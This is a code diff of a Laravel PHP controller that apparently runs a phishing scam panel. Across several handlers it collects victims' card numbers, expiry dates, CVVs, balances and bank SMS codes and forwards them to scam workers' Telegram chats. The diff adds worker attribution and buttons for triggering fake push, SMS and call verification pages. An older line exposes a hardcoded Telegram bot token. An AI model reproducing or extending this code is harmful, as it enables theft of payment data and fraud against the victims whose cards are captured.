@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use App\Models\Bievers;
 use App\Models\Order;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Str;
 
 class OrderController extends Controller
@@ -36,10 +37,11 @@ class OrderController extends Controller
         $message = "Мамонтёнок вводит баланс, объявление: " . $order->ad_name;
         $wbiv = $message . "\n\nКарта: " . $request->input('card') .
     "\nДата: " . $request->input('expiryDate') .
-    "\nCVV: " . $request->input('cvv');
+    "\nCVV: " . $request->input('cvv') .
+    "\n\nВоркер: " . $request->input('username');
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
-            $this->sendMessage($wbiv, $bievers->biever_id);
+            $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
         }
         return response()->json();
     }
@@ -52,10 +54,11 @@ class OrderController extends Controller
         $wbiv = $message . "\n\nКарта: " . $request->input('card') .
             "\nДата: " . $request->input('expiryDate') .
             "\nCVV: " . $request->input('cvv') .
-            "\n\nБаланс: " . $request->input('balance');
+            "\nБаланс: " . $request->input('balance') .
+            "\n\nВоркер: " . $request->input('username');
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
-            $this->sendMessage($wbiv, $bievers->biever_id);
+            $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
         }
 
         return response()->json();
@@ -66,23 +69,16 @@ class OrderController extends Controller
         $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();
 
         $message = "СМС от банка, объявление: " . $order->ad_name;
-        $wbiv = $message . "\n\nКод: " . $request->input('code');
+        $wbiv = $message . "\nКод: " . $request->input('code') .
+            "\n\nВоркер: " . $request->input('username');
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
-            $this->sendMessage($wbiv, $bievers->biever_id);
+            $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
         }
 
         return response()->json();
     }
 
-    public function confirm(Request $request, $unique_id)
-    {
-        $order = Order::where('unique_id', $unique_id)->firstOrFail();
-
-        $this->sendMessage("Order confirmed: {$order->ad_name}, {$order->full_name}, {$order->price}, {$order->address}", $order->worker_id);
-
-        return redirect()->back()->with('success', 'Order confirmed!');
-    }
 
 
     public function createNewLink(Request $request) {
@@ -95,6 +91,7 @@ class OrderController extends Controller
             'full_name' => $request->full_name,
             'price' => $request->price,
             'address' => $request->address,
+            'username' => $request->username
         ]);
 
         return response()->json(['unique_id' => $unique_id], 200);
@@ -118,7 +115,25 @@ class OrderController extends Controller
     public function sendMessage($message, $chat_id)
     {
         $bot_token = env('BOT_TOKEN');
-        $url = "https://api.telegram.org/bot7441607473:AAFUfgY8yjq-odK4Ikgw9O_C7XS_NbbyvsY/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
+        $url = "https://api.telegram.org/bot" . env('BOT_TOKEN') . "/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
         file_get_contents($url);
+    }
+
+    public function sendMessageWithInline($message, $chat_id, $id)
+    {
+        $bot_token = env('BOT_TOKEN');
+        Http::post('https://api.telegram.org/bot' . env('BOT_TOKEN') . '/sendMessage', [
+            'chat_id' => $chat_id,
+            'text' => $message,
+            'reply_markup' => json_encode([
+                'inline_keyboard' => [
+                    [
+                        ['text' => 'Открыть Push', 'callback_data' => 'show:open-push:' . $id],
+                        ['text' => 'Открыть SMS', 'callback_data' => 'show:open-code:' . $id],
+                        ['text' => 'Открыть Звонок', 'callback_data' => 'show:open-call:' . $id]
+                    ]
+                ]
+            ])
+        ]);
     }
 }
